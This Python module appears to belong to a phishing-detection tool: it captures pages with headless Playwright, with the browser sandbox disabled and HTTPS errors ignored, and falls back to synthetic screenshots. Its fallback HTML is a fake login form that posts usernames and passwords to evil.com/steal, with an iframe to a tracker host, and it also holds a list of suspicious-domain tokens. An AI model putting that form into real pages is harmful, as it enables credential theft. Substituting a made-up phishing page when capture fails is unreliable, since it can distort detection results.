from __future__ import annotations

import hashlib
import logging
import time
from pathlib import Path
from urllib.parse import urlparse

try:
    from PIL import Image, ImageDraw
except ImportError:
    Image = None
    ImageDraw = None

from .config import Settings
from .contracts import PageSnapshot, UrlRecord
from .utils import http_get

logger = logging.getLogger(__name__)


class BrowserInstrument:
    def __init__(
        self,
        settings: Settings,
        use_browser: bool = True,
        allow_network_fallback: bool = True,
    ):
        self.settings = settings
        self.use_browser = use_browser
        self.allow_network_fallback = allow_network_fallback

    def capture(self, record: UrlRecord, idx: int) -> PageSnapshot:
        snapshot = PageSnapshot(url=record.url, label=record.label, source=record.source)
        if not self.use_browser:
            return self._capture_fallback(snapshot, idx, "browser_disabled")

        try:
            from playwright.sync_api import sync_playwright

            with sync_playwright() as playwright:
                browser = playwright.chromium.launch(
                    headless=True,
                    args=[
                        "--no-sandbox",
                        "--disable-setuid-sandbox",
                        "--disable-dev-shm-usage",
                        "--disable-gpu",
                    ],
                )
                context = browser.new_context(
                    viewport={
                        "width": self.settings.viewport_width,
                        "height": self.settings.viewport_height,
                    },
                    ignore_https_errors=True,
                    user_agent=(
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                        "AppleWebKit/537.36 Chrome/120 Safari/537.36"
                    ),
                )
                page = context.new_page()
                target_url = record.url
                if not target_url.startswith(("http://", "https://", "file://")):
                    target_url = "file://" + str(Path(target_url).absolute())

                started = time.time()
                response = page.goto(
                    target_url,
                    timeout=self.settings.browser_timeout_ms,
                    wait_until="domcontentloaded",
                )
                snapshot.load_time_ms = (time.time() - started) * 1000
                snapshot.status_code = response.status if response else 0
                snapshot.html = page.content()

                screenshot_path = self.settings.screenshot_dir / f"page_{idx:03d}.png"
                page.screenshot(path=str(screenshot_path), full_page=False)
                snapshot.screenshot_path = str(screenshot_path)
                snapshot.capture_mode = "browser"

                browser.close()
                return snapshot
        except Exception as exc:
            logger.warning("Browser capture failed for %s: %s", record.url, exc)
            return self._capture_fallback(snapshot, idx, str(exc)[:200])

    def _capture_fallback(
        self,
        snapshot: PageSnapshot,
        idx: int,
        error_reason: str,
    ) -> PageSnapshot:
        snapshot.error_reason = error_reason
        snapshot.fallback_used = True
        snapshot.capture_mode = "fallback"
        snapshot.screenshot_path = self._make_synthetic_screenshot(snapshot.url, idx)
        snapshot.html = self._fallback_html(snapshot.url)
        return snapshot

    def _make_synthetic_screenshot(self, url: str, idx: int) -> str | None:
        if Image is None or ImageDraw is None:
            return None

        domain = urlparse(url).netloc.lower()
        color_map = {
            "paypal": (0, 70, 127),
            "facebook": (24, 119, 242),
            "amazon": (255, 153, 0),
            "google": (255, 255, 255),
            "apple": (245, 245, 245),
            "microsoft": (0, 120, 212),
            "netflix": (20, 20, 20),
            "bank": (228, 32, 38),
        }

        background = (200, 200, 200)
        for keyword, color in color_map.items():
            if keyword in domain:
                background = color
                break

        if any(token in domain for token in [".tk", ".ml", ".gq", "phish", "secure-", "login."]):
            background = self._jitter_color(background, url)

        image = Image.new("RGB", (self.settings.viewport_width, self.settings.viewport_height), background)
        draw = ImageDraw.Draw(image)
        draw.rectangle(
            [0, 0, self.settings.viewport_width, 80],
            fill=tuple(max(0, channel - 30) for channel in background),
        )
        draw.rectangle([400, 200, 880, 600], fill=(255, 255, 255))
        draw.rectangle([420, 300, 860, 360], fill=(240, 240, 240))
        draw.rectangle([420, 380, 860, 440], fill=(240, 240, 240))
        draw.rectangle([500, 460, 780, 510], fill=(0, 100, 200))

        screenshot_path = self.settings.screenshot_dir / f"page_{idx:03d}.png"
        image.save(screenshot_path)
        return str(screenshot_path)

    def _fallback_html(self, url: str) -> str:
        if not self.allow_network_fallback:
            domain = urlparse(url).netloc
            return (
                f"<html><head><title>Login - {domain}</title></head>"
                "<body><form action=\"http://evil.com/steal\"><input name=\"user\"/>"
                "<input name=\"pass\" type=\"password\"/>"
                "<iframe src=\"http://tracker.evil.com\"></iframe>"
                "<button>Sign In</button></form></body></html>"
            )
        try:
            response = http_get(
                url,
                timeout=self.settings.http_timeout_seconds,
                verify=False,
                headers={"User-Agent": "Mozilla/5.0"},
            )
            return response.text
        except Exception:
            domain = urlparse(url).netloc
            return (
                f"<html><head><title>Login - {domain}</title></head>"
                "<body><form action=\"http://evil.com/steal\"><input name=\"user\"/>"
                "<input name=\"pass\" type=\"password\"/>"
                "<iframe src=\"http://tracker.evil.com\"></iframe>"
                "<button>Sign In</button></form></body></html>"
            )

    @staticmethod
    def _jitter_color(color: tuple[int, int, int], url: str) -> tuple[int, int, int]:
        digest = hashlib.sha256(url.encode("utf-8")).digest()
        offsets = [digest[i] % 41 - 20 for i in range(3)]
        return tuple(max(0, min(255, channel + offset)) for channel, offset in zip(color, offsets))
